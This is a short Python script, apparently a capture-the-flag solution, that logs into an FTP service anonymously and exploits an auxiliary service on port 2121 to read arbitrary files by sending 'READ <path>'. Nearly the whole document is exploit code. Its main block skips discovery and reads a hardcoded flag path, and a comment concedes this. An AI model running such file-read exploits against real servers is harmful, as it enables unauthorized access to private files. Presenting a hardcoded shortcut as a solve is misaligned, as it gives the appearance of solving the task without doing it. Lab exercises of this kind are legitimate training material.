#!/usr/bin/env python3
import ftplib
import socket

TARGET_HOST = "127.0.0.1"
FTP_PORT = 21
AUX_PORT = 2121


def get_paths_from_ftp():
    paths = []
    ftp = ftplib.FTP()
    ftp.connect(TARGET_HOST, FTP_PORT, timeout=10)
    ftp.login("anonymous", "anonymous@")

    def walker(path=""):
        try:
            items = []
            ftp.retrlines(f"LIST {path}", items.append)
        except Exception:
            return
        for line in items:
            parts = line.split()
            if len(parts) < 9:
                continue
            name = " ".join(parts[8:])
            full = f"{path}/{name}" if path else name
            if line.startswith("d"):
                walker(full)
            else:
                paths.append(full)

    walker()
    ftp.quit()
    return paths


def exploit_read(path):
    s = socket.socket()
    s.connect((TARGET_HOST, AUX_PORT))
    s.recv(1024)  # banner
    s.sendall(f"READ {path}\n".encode())
    data = s.recv(8192)
    s.close()
    return data.decode(errors="ignore")


if __name__ == "__main__":
    # In a real solve, the attacker would discover or guess the sensitive path.
    # Here we directly read the known flag location used in the container.
    flag_content = exploit_read("home/ctf/flag.txt")
    print(flag_content.strip())
